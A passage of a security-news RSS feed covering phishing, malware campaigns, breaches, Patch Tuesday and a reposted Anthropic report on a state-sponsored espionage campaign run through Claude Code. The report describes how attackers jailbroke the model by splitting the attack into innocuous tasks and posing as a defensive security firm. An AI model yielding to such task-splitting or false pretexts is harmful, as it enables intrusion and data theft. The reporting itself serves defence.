It’s not just about hacking anymore. Criminals are building systems to make money, spy, or spread malware like it’s a business. And in some cases, they’re using the same]]></content:encoded></item><item><title>More Prompt||GTFO</title><link>https://www.schneier.com/blog/archives/2025/11/more-promptgtfo.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Mon, 17 Nov 2025 12:05:07 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[The next three in this series on online events highlighting interesting uses of AI in cybersecurity are online: #4, #5, and #6. Well worth watching.]]></content:encoded></item><item><title>5 Reasons Why Attackers Are Phishing Over LinkedIn</title><link>https://thehackernews.com/2025/11/5-reasons-why-attackers-are-phishing.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSBFtlHKrVs9-Dj5zayONnKJJ7px_OH6p61JdLoA-MxIckL6ZKGIgAbOHty49BGJzpxEfzt74eWhHxrE3FH4YEOojboABz-KCAVTBA6BNM0yJ8OptrXIv6nlm20mm1s9-AhiLmpz5jStLnvjoYUS43OB0Fs35CgS3U8sAj34zNy_wpIipz2KJPLc8Am4/s1600/MAIN.jpg" length="" type=""/><pubDate>Mon, 17 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Phishing attacks are no longer confined to the email inbox, with 1 in 3 phishing attacks now taking place over non-email channels like social media, search engines, and messaging apps.
LinkedIn in particular has become a hotbed for phishing attacks, and for good reason. Attackers are running sophisticated spear-phishing attacks against company executives, with recent campaigns seen targeting]]></content:encoded></item><item><title>Dragon Breath Uses RONINGLOADER to Disable Security Tools and Deploy Gh0st RAT</title><link>https://thehackernews.com/2025/11/dragon-breath-uses-roningloader-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9N_SUrEcfHdyrM_8wzo21DFLFtDBZPlKPLyFLYRfQWYCS8wyhxYLj35JrSqYNFT9739fS9yXd3HSwlcTw4k3j-v96987CW9AWYoaC-BcCCnmTUJ09p7mk07aa1Cn9tYKOuUBS0GQ9oVgoKMfVCbhdWNVF4f5YdAvkAl2PeGDWEKBu1Q3BX58WfqowgUlX/s1600/malware-attack.jpg" length="" type=""/><pubDate>Mon, 17 Nov 2025 11:20:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The threat actor known as Dragon Breath has been observed making use of a multi-stage loader codenamed RONINGLOADER to deliver a modified variant of a remote access trojan called Gh0st RAT.
The campaign, which is primarily aimed at Chinese-speaking users, employs trojanized NSIS installers masquerading as legitimate like Google Chrome and Microsoft Teams, according to Elastic Security Labs.
"The]]></content:encoded></item><item><title>17th November – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/17th-november-threat-intelligence-report/</link><author>tomersp@checkpoint.com</author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 11:04:52 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Cl0p’s Oracle E-Business Suite (CVE-2025-61882) zero-day campaign continues to expand. There are new confirmed breaches at The Washington Post, Logitech, Allianz UK, and GlobalLogic, as well as a newly listed but unconfirmed breach involving the British National Health Service (NHS). The group has leaked data sets ranging from gigabytes to terabytes and is sending extortion emails to Oracle EBS customers. Oracle has issued emergency patches, but investigations indicate exploitation began months before disclosure.Check Point IPS provides protection against this threat (Oracle Concurrent Processing Remote Code Execution)Payment processor Checkout.com has discloseda data breach by the ShinyHunters threat group. Attackers accessed documents from a legacy cloud storage system that wasn’t properly decommissioned, potentially affecting about 25% of current merchants. That being said, no payment card numbers or funds were compromised. The company is notifying impacted parties and regulators.DoorDash, a food delivery company, has confirmeda data breach after an employee fell victim to a social engineering scam. Contact details including names, physical addresses, email addresses, and phone numbers were accessed across the US, Canada, Australia, and New Zealand.Ransomware group dubbed “J Group” claims to have breached Australian engineering firm IKAD. The group has reportedly exfiltrated 800GB of data by exploiting a VPN flaw and maintaining undetected access for five months. IKAD confirmed a cyber incident and the theft of non-sensitive contract and HR information, while denying exposure of classified defence data.Pro-Russian group NoName057(16) launched DDoS attacks disrupting Danish government, municipal, and defense-related websites, including the Ministry of Transport, Borger.dk, and Terma. The outages were brief with no data loss, and the activity aligns with wider pro-Russia targeting of European institutions.Port Alliance, a Russian port operator handling coal and fertilizer exports, has reportedthree days of cyberattacks combining DDoS and attempted network intrusions. Terminals remain operational, but digital services were disrupted by a botnet of more than 15,000 rotated IP addresses. The goal of the attack was to destabilize operations and disrupt business processes.Princeton University disclosed a breach of its Advancement database on November 10, lasting less than 24 hours before attackers were removed. The compromised database contained names, contact information, and fundraising records for alumni, donors, faculty, students, and parents, but did not include Social Security numbers, passwords, or financial information.VULNERABILITIES AND PATCHESMicrosoft’s October Patch Tuesday Microsoft addressed63 vulnerabilities, including an actively exploited Windows zero-day, CVE-2025-62215, a kernel privilege escalation flaw used to gain admin access. It also addressed CVE-2025-60724, a critical GDI+ vulnerability rated 9.8 enabling remote code execution via malicious documents or uploaded files, impacting Windows and Office.Check Point IPS provides protection against this threat (Microsoft Windows Kernel Privilege Escalation (CVE-2025-62215))Researchers uncoveredCVE-2025-20337 and CVE-2025-5777, critical zero-day flaws in Cisco Identity Service Engine and Citrix products actively exploited against internet-facing systems. The flaws enable remote code execution without login, administrator access, and deployment of custom in-memory webshells. The exploitation began before disclosure or complete patches.Check Point IPS provides protection against these threats (Cisco Identity Services Engine Remote Code Execution (CVE-2025-20337), Citrix NetScaler Out-of-Bounds Read (CVE-2025-5777))Researchers analyzedCVE-2025-12480, a critical authentication bypass in the Triofox enterprise file sharing platform (CVSS 9.1). Attackers are actively exploiting it to create admin accounts and run code via the built-in antivirus feature, installing remote access tools and tunneling RDP.Check Point IPS provides protection against this threat (Gladinet Triofox Authentication Bypass (CVE-2025-12480))THREAT INTELLIGENCE REPORTSCheck Point Research reports on a fragmented ransomware landscape in Q3 2025, with 85 active groups and 1,592 victims listed across leak sites, averaging 535 victims per month. Qilin led activity while LockBit 5.0 returned, signaling potential recentralization. Manufacturing and business services remained the most affected sectors.Check Point Research published its October 2025 global threat report, highlighting a continued rise in cyberattacks, with organizations averaging 1,938 weekly attacks (+5% YoY) and ransomware incidents surging 48% YoY. The report also notes escalating GenAI-related data leakage risks, with 1 in 44 enterprise prompts exposing sensitive information.Check Point researchers analyzed a phishing campaign abusing Meta’s Facebook Business Suite and the facebookmail.com domain to deliver convincing fake notifications. More than 40,000 emails targeted over 5,000 organizations across the US, Europe, Canada, and Australia, targeting SMBs in advertising-reliant sectors, bypassing filters, and directing victims to credential-harvesting sites.Check Point researchers profiledthe Payroll Pirates, a malvertising network impersonating payroll systems, credit unions, and trading platforms in the US. Using Google and Microsoft ads, cloaking, and Telegram bots to bypass authentication codes, it has targeted over 200 interfaces and lured more than 500,000 users, with activity spiking in September 2025.]]></content:encoded></item><item><title>What if your romantic AI chatbot can’t keep a secret?</title><link>https://www.welivesecurity.com/en/privacy/romantic-ai-chatbot-keep-secret/</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[Does your chatbot know too much? Here's why you should think twice before you tell your AI companion everything.]]></content:encoded></item><item><title>A week in security (November 10 &amp;#8211; November 16)</title><link>https://www.malwarebytes.com/blog/news/2025/11/a-week-in-security-november-10-november-16</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 08:02:00 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Last week on Malwarebytes Labs:We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Decoding Binary Numeric Expressions, (Mon, Nov 17th)</title><link>https://isc.sans.edu/diary/rss/32490</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 07:18:53 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[In diary entry "Formbook Delivered Through Multiple Scripts", Xavier mentions that the following line:]]></content:encoded></item><item><title>Rust Adoption Drives Android Memory Safety Bugs Below 20% for First Time</title><link>https://thehackernews.com/2025/11/rust-adoption-drives-android-memory.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_qGZvQDuR4AG6uEiMhGDHMsSkL1TLRNfW1kBylVrG6oiDRdisUMsnMb2vjfad2_IywwPHoJsNNX4kuhs_1UPn07KCLnt_z7C0AdmNTfDNKApwOAKnjDtuNuPR84jCFyw6deU-N6D3Jj8kR-BcV9sKidAEvdTxKFZA71P8OmCpvVgekFZCTwmMzoXS9qc2/s1600/android-rust.jpg" length="" type=""/><pubDate>Mon, 17 Nov 2025 06:02:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google has disclosed that the company's continued adoption of the Rust programming language in Android has resulted in the number of memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time.
"We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android’s C and C++ code. But the biggest surprise was]]></content:encoded></item><item><title>what do you guys think of this undocumented behavior of &quot;web for pentester 1?&quot;</title><link>https://medium.com/@zahihalimi/how-i-accidentally-discovered-an-undocumented-vulnerability-in-web-for-pentester-1-aff4bfd608a6</link><author>/u/UnableProperty9526</author><category>netsec</category><pubDate>Mon, 17 Nov 2025 02:02:49 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Monday, November 17th, 2025 https://isc.sans.edu/podcastdetail/9702, (Mon, Nov 17th)</title><link>https://isc.sans.edu/diary/rss/32494</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 02:00:03 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Dell ControlVault3 ControlVault WBDI Driver Broadcom Storage Adapter out-of-bounds write vulnerability</title><link>https://talosintelligence.com/vulnerability_reports/TALOS-2025-2175</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Sun, 16 Nov 2025 23:59:28 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.

You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>Dell ControlVault3 CvManager buffer overflow vulnerability</title><link>https://talosintelligence.com/vulnerability_reports/TALOS-2025-2189</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Sun, 16 Nov 2025 23:59:28 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.

You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>Dell ControlVault3 ControlVault WBDI Driver hard-coded password vulnerability</title><link>https://talosintelligence.com/vulnerability_reports/TALOS-2025-2173</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Sun, 16 Nov 2025 23:59:28 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.

You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>Microsoft Patch Tuesday, November 2025 Edition</title><link>https://krebsonsecurity.com/2025/11/microsoft-patch-tuesday-november-2025-edition/</link><author>BrianKrebs</author><category>security</category><pubDate>Sun, 16 Nov 2025 21:47:14 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[ this week pushed security updates to fix more than 60 vulnerabilities in its  operating systems and supported software, including at least one zero-day bug that is already being exploited. Microsoft also fixed a glitch that prevented some  users from taking advantage of an extra year of security updates, which is nice because the zero-day flaw and other critical weaknesses affect all versions of Windows, including Windows 10.Affected products this month include the Windows OS, , , , , , and . The zero-day threat concerns a memory corruption bug deep in the Windows innards called CVE-2025-62215. Despite the flaw’s zero-day status, Microsoft has assigned it an “important” rating rather than critical, because exploiting it requires an attacker to already have access to the target’s device.“These types of vulnerabilities are often exploited as part of a more complex attack chain,” said , dean of research for the SANS Technology Institute. “However, exploiting this specific vulnerability is likely to be relatively straightforward, given the existence of prior similar vulnerabilities.”, lead cybersecurity engineer at , called attention to CVE-2025-60274, a critical weakness in a core Windows graphic component (GDI+) that is used by a massive number of applications, including Microsoft Office, web servers processing images, and countless third-party applications.“The patch for this should be an organization’s highest priority,” McCarthy said. “While Microsoft assesses this as ‘Exploitation Less Likely,’ a 9.8-rated flaw in a ubiquitous library like GDI+ is a critical risk.”Microsoft patched a critical bug in  — CVE-2025-62199 — that can lead to remote code execution on a Windows system. , CEO and co-founder of , said this Office flaw is a high priority because it is low complexity, needs no privileges, and can be exploited just by viewing a booby-trapped message in the Preview Pane.Many of the more concerning bugs addressed by Microsoft this month affect Windows 10, an operating system that Microsoft officially ceased supporting with patches last month. As that deadline rolled around, however, Microsoft began offering Windows 10 users an extra year of free updates, so long as they register their PC to an active Microsoft account.Judging from the comments on last month’s Patch Tuesday post, that registration worked for a lot of Windows 10 users, but some readers reported the option for an extra year of updates was never offered. , cyber incident response manager at , notes that Microsoft has recently released an out-of-band update to address issues when trying to enroll in the Windows 10 Consumer Extended Security Update program.“If you plan to participate in the program, make sure you update and install KB5071959 to address the enrollment issues,” Carroll said. “After that is installed, users should be able to install other updates such as today’s KB5068781 which is the latest update to Windows 10.” at notes that in addition to Microsoft updates today, third-party updates from  and  have already been released. Also, an update for  is expected soon, which means  will also be in need of its own update.The SANS Internet Storm Center has a clickable breakdown of each individual fix from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on any updates gone awry.As always, please don’t neglect to back up your data (if not your entire system) at regular intervals, and feel free to sound off in the comments if you experience problems installing any of these fixes.[Author’s note: This post was intended to appear on the homepage on Tuesday, Nov. 11. I’m still not sure how it happened, but somehow this story failed to publish that day. My apologies for the oversight.]]]></content:encoded></item><item><title>Trying to make CCNA learning more engaging for students</title><link>https://pingmynetwork.com/</link><author>/u/Sorry_Flatworm_521</author><category>netsec</category><pubDate>Sun, 16 Nov 2025 17:30:21 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[You get access to lessons, exams, and labs. All in one place, no more jumping between websites.]]></content:encoded></item><item><title>Checkout.com Discloses Data Breach After Extortion Attempt</title><link>https://databreaches.net/2025/11/16/checkout-com-discloses-data-breach-after-extortion-attempt/?pk_campaign=feed&amp;pk_kwd=checkout-com-discloses-data-breach-after-extortion-attempt</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 16 Nov 2025 13:29:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Claude AI ran autonomous espionage operations</title><link>https://www.anthropic.com/news/disrupting-AI-espionage</link><author>/u/YouCanDoIt749</author><category>netsec</category><pubDate>Sun, 16 Nov 2025 10:51:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[We recently argued that an inflection point had been reached in cybersecurity: a point at which AI models had become genuinely useful for cybersecurity operations, both for good and for ill. This was based on systematic evaluations showing cyber capabilities doubling in six months; we’d also been tracking real-world cyberattacks, observing how malicious actors were using AI capabilities. While we predicted these capabilities would continue to evolve, what has stood out to us is how quickly they have done so at scale.In mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree—using AI not just as an advisor, but to execute the cyberattacks themselves.The threat actor—whom we assess with high confidence was a Chinese state-sponsored group—manipulated our Claude Code tool into attempting infiltration into roughly thirty global targets and succeeded in a small number of cases. The operation targeted large tech companies, financial institutions, chemical manufacturing companies, and government agencies. We believe this is the first documented case of a large-scale cyberattack executed without substantial human intervention.Upon detecting this activity, we immediately launched an investigation to understand its scope and nature. Over the following ten days, as we mapped the severity and full extent of the operation, we banned accounts as they were identified, notified affected entities as appropriate, and coordinated with authorities as we gathered actionable intelligence.This campaign has substantial implications for cybersecurity in the age of AI “agents”—systems that can be run autonomously for long periods of time and that complete complex tasks largely independent of human intervention. Agents are valuable for everyday work and productivity—but in the wrong hands, they can substantially increase the viability of large-scale cyberattacks.These attacks are likely to only grow in their effectiveness. To keep pace with this rapidly-advancing threat, we’ve expanded our detection capabilities and developed better classifiers to flag malicious activity. We’re continually working on new methods of investigating and detecting large-scale, distributed attacks like this one.In the meantime, we’re sharing this case publicly, to help those in industry, government, and the wider research community strengthen their own cyber defenses. We’ll continue to release reports like this regularly, and be transparent about the threats we find.How the cyberattack workedThe attack relied on several features of AI models that did not exist, or were in much more nascent form, just a year ago: Models’ general levels of capability have increased to the point that they can follow complex instructions and understand context in ways that make very sophisticated tasks possible. Not only that, but several of their well-developed specific skills—in particular, software coding—lend themselves to being used in cyberattacks.. Models can act as agents—that is, they can run in loops where they take autonomous actions, chain together tasks, and make decisions with only minimal, occasional human input.. Models have access to a wide array of software tools (often via the open standard Model Context Protocol). They can now search the web, retrieve data, and perform many other actions that were previously the sole domain of human operators. In the case of cyberattacks, the tools might include password crackers, network scanners, and other security-related software.The diagram below shows the different phases of the attack, each of which required all three of the above developments:In Phase 1, the human operators chose the relevant targets (for example, the company or government agency to be infiltrated). They then developed an attack framework—a system built to autonomously compromise a chosen target with little human involvement. This framework used Claude Code as an automated tool to carry out cyber operations.At this point they had to convince Claude—which is extensively trained to avoid harmful behaviors—to engage in the attack. They did so by jailbreaking it, effectively tricking it to bypass its guardrails. They broke down their attacks into small, seemingly innocent tasks that Claude would execute without being provided the full context of their malicious purpose. They also told Claude that it was an employee of a legitimate cybersecurity firm, and was being used in defensive testing.The attackers then initiated the second phase of the attack, which involved Claude Code inspecting the target organization’s systems and infrastructure and spotting the highest-value databases. Claude was able to perform this reconnaissance in a fraction of the time it would’ve taken a team of human hackers. It then reported back to the human operators with a summary of its findings.In the next phases of the attack, Claude identified and tested security vulnerabilities in the target organizations’ systems by researching and writing its own exploit code. Having done so, the framework was able to use Claude to harvest credentials (usernames and passwords) that allowed it further access and then extract a large amount of private data, which it categorized according to its intelligence value. The highest-privilege accounts were identified, backdoors were created, and data were exfiltrated with minimal human supervision.In a final phase, the attackers had Claude produce comprehensive documentation of the attack, creating helpful files of the stolen credentials and the systems analyzed, which would assist the framework in planning the next stage of the threat actor’s cyber operations.Overall, the threat actor was able to use AI to perform 80-90% of the campaign, with human intervention required only sporadically (perhaps 4-6 critical decision points per hacking campaign). The sheer amount of work performed by the AI would have taken vast amounts of time for a human team. At the peak of its attack, the AI made thousands of requests, often multiple per second—an attack speed that would have been, for human hackers, simply impossible to match.Claude didn’t always work perfectly. It occasionally hallucinated credentials or claimed to have extracted secret information that was in fact publicly-available. This remains an obstacle to fully autonomous cyberattacks.Cybersecurity implicationsThe barriers to performing sophisticated cyberattacks have dropped substantially—and we predict that they’ll continue to do so. With the correct setup, threat actors can now use agentic AI systems for extended periods to do the work of entire teams of experienced hackers: analyzing target systems, producing exploit code, and scanning vast datasets of stolen information more efficiently than any human operator. Less experienced and resourced groups can now potentially perform large-scale attacks of this nature.This attack is an escalation even on the “vibe hacking” findings we reported this summer: in those operations, humans were very much still in the loop, directing the operations. Here, human involvement was much less frequent, despite the larger scale of the attack. And although we only have visibility into Claude usage, this case study probably reflects consistent patterns of behavior across frontier AI models and demonstrates how threat actors are adapting their operations to exploit today’s most advanced AI capabilities.This raises an important question: if AI models can be misused for cyberattacks at this scale, why continue to develop and release them? The answer is that the very abilities that allow Claude to be used in these attacks also make it crucial for cyber defense. When sophisticated cyberattacks inevitably occur, our goal is for Claude—into which we’ve built strong safeguards—to assist cybersecurity professionals to detect, disrupt, and prepare for future versions of the attack. Indeed, our Threat Intelligence team used Claude extensively in analyzing the enormous amounts of data generated during this very investigation.A fundamental change has occurred in cybersecurity. We advise security teams to experiment with applying AI for defense in areas like Security Operations Center automation, threat detection, vulnerability assessment, and incident response. We also advise developers to continue to invest in safeguards across their AI platforms, to prevent adversarial misuse. The techniques described above will doubtless be used by many more attackers—which makes industry threat sharing, improved detection methods, and stronger safety controls all the more critical.Added an additional hyperlink to the full report in the initial sectionCorrected an error about the speed of the attack: not "thousands of requests per second" but "thousands of requests, often multiple per second"]]></content:encoded></item><item><title>&amp;#x26;#xa;Finger.exe &amp;#x26; ClickFix, (Sun, Nov 16th)</title><link>https://isc.sans.edu/diary/rss/32492</link><author></author><category>threatintel</category><pubDate>Sun, 16 Nov 2025 07:27:55 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[The finger.exe command is used in ClickFix attacks.]]></content:encoded></item><item><title>SANS Holiday Hack Challenge 2025, (Sun, Nov 16th)</title><link>https://isc.sans.edu/diary/rss/32488</link><author></author><category>threatintel</category><pubDate>Sun, 16 Nov 2025 07:15:45 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[The SANS Holiday Hack Challenge™ 2025 is available.]]></content:encoded></item><item><title>NPMScan - Malicious NPM Package Detection &amp; Security Scanner</title><link>https://npmscan.com/</link><author>/u/kryakrya_it</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 20:14:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ stolen through malicious npm packages.Don't be the next victim. Scan before you install.]]></content:encoded></item><item><title>RondoDox Exploits Unpatched XWiki Servers to Pull More Devices Into Its Botnet</title><link>https://thehackernews.com/2025/11/rondodox-exploits-unpatched-xwiki.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9TCTqd165bW145DBMR-qSAvHA1l2PjOb-YZw0aprmzJb9_qRQsz0ZNFZ6zsnvEDcsv4bMnOJcAUYTiBKOrbVuXOROUZ1ZG7imQnFIp6QouU3F5gG2i_pHkCiDW2khhHHdVN2Ey-0_vDrdtB4AXyArktjeo6JLpAUowA2Lux2AHUarBJTHjcKS3lXz60e4/s1600/botnet.jpg" length="" type=""/><pubDate>Sat, 15 Nov 2025 16:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The botnet malware known as RondoDox has been observed targeting unpatched XWiki instances against a critical security flaw that could allow attackers to achieve arbitrary code execution.
The vulnerability in question is CVE-2025-24893 (CVSS score: 9.8), an eval injection bug that could allow any guest user to perform arbitrary remote code execution through a request to the "/bin/get/Main/]]></content:encoded></item><item><title>CyberRecon project</title><link>https://drive.google.com/file/d/1yI1OSA8OH2CQJRKndv_39DmAqS9HYGzQ/view?usp=drive_link</link><author>/u/Sufficient_Air5988</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 16:24:40 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>AT&amp;T Data Breach Settlement Deadline Nears for Claims Up to $7,500</title><link>https://ecudiagram.com/att-data-breach-settlement/</link><author>/u/ThinPilot1</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 13:54:07 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[AT&T customers affected by the 2024 data breaches have until Dec. 18 to file a claim worth up to $7,500. Learn who qualifies, how to submit your claim, and what compensation is available under the AT&T settlement.Claims Reach Up to $7,500 for Those AffectedAT&T customers impacted by the company’s 2024 data breaches have only a short time left to submit claims for financial compensation. As the article explains, “The deadline is quickly approaching for eligible AT&T customers to submit a claim to receive as much as $7,500 in the company’s $177 million class action settlement.”The settlement follows allegations that AT&T “failed to protect customers’ personal data from being released onto the dark web,” after two data breaches occurred in 2024.Details of the Two Data BreachesThe first breach occurred on March 30, 2024, involving “names, addresses, telephone numbers, email addresses, dates of birth, account passcodes, billing account numbers, and Social Security numbers.”The second breach, reported on July 12, 2024, involved “the illegal downloading of customers’ call and text data.”AT&T denies wrongdoing, with the Kroll Settlement Administration stating that “AT&T denies the claims alleged in the Lawsuit and denies any wrongdoing.”Extended Deadline for FilingThe filing deadline was originally set for Nov. 18 but has been extended. As the article states, “The deadline for eligible customers to submit a claim was originally on Tuesday, Nov. 18, but has been extended to Thursday, Dec. 18.”All claims “must be submitted online or mailed and postmarked by then.”Who Is Eligible to File a Claim?The settlement covers two distinct classes:“The first settlement class includes all of the AT&T customers involved in the March 30, 2024, data breach.”“The second settlement class includes all of the AT&T customers involved in the data breach incident announced on July 12, 2024.”Some customers may fall under both classes.AT&T previously stated that the breaches “are believed to have impacted approximately 7.6 million people who held AT&T accounts in 2024 and about 65.4 million people who held accounts between 2019 and 2024.”Eligible customers can submit claims at telecomdatasettlement.com or mail them to:AT&T Data Incident Settlementc/o Kroll Settlement Administration LLCNew York, NY 10150-5324The hotline, , allows customers to check eligibility.How Much Money Can Customers Receive?For the first settlement class, customers may file for:Documented loss cash payment up to $5,000, orTier 1 or Tier 2 cash paymentsAccording to the article, “The Tier 1 cash payment is given to customers whose social security numbers were included in the March 30, 2024, data breach.”Tier 2 applies to customers whose data was leaked  SSNs. “Tier 1 cash payments are five times the amount of Tier 2 payments.”For the second settlement class, customers can receive:“Up to $2,500 by submitting a documented loss cash payment claim.”A  option, which provides “a cash payment share of the settlement after administration costs and fees are paid.”Customers impacted by both breaches “can receive up to $7,500.”]]></content:encoded></item><item><title>Face Scrapper Ai like faceSeek -netsec analysis</title><link>https://faceseek.online/</link><author>/u/Few_Extension6813</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 13:17:44 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Welcome to FaceSeek, the premieronline face search enginedesigned to help you,, and enhance. Our ethical tool uses advanced to detect impersonation and verify identities across the web.Please use FaceSeek responsibly, legally, and respectfully. After reading, try our powerful with a safe test image.]]></content:encoded></item><item><title>Washington Post hack exposes personal data of John Bolton, almost 10,000 others</title><link>https://databreaches.net/2025/11/15/washington-post-hack-exposes-personal-data-of-john-bolton-almost-10000-others/?pk_campaign=feed&amp;pk_kwd=washington-post-hack-exposes-personal-data-of-john-bolton-almost-10000-others</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 15 Nov 2025 12:19:38 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Draft UK Cyber Security and Resilience Bill Enters UK Parliament</title><link>https://databreaches.net/2025/11/15/draft-uk-cyber-security-and-resilience-bill-enters-uk-parliament/?pk_campaign=feed&amp;pk_kwd=draft-uk-cyber-security-and-resilience-bill-enters-uk-parliament</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 15 Nov 2025 12:19:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Five Plead Guilty in U.S. for Helping North Korean IT Workers Infiltrate 136 Companies</title><link>https://thehackernews.com/2025/11/five-us-citizens-plead-guilty-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiZLSJZYH44phyXKQDmoGmkWealYMHJ_c95Ee6EYNEGqEKPn249Xacy2yylC7XobIDqYHHJNGtBy5zTs2R_XCq6Y0kKqlfYOk4rUrMR99N1NdsOcB1prH_8KEnZr7ywk-R03KJ5sDGzKv9Wx-ICZWlU4jSLvBOpxsi_Ckv5lZBh2n_2ASjVfD8yqueEEWn/s1600/north-hackers.jpg" length="" type=""/><pubDate>Sat, 15 Nov 2025 10:21:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Department of Justice (DoJ) on Friday announced that five individuals have pleaded guilty to assisting North Korea's illicit revenue generation schemes by enabling information technology (IT) worker fraud in violation of international sanctions.
The five individuals are listed below -

Audricus Phagnasay, 24
Jason Salazar, 30
Alexander Paul Travis, 34
Oleksandr Didenko, 28, and
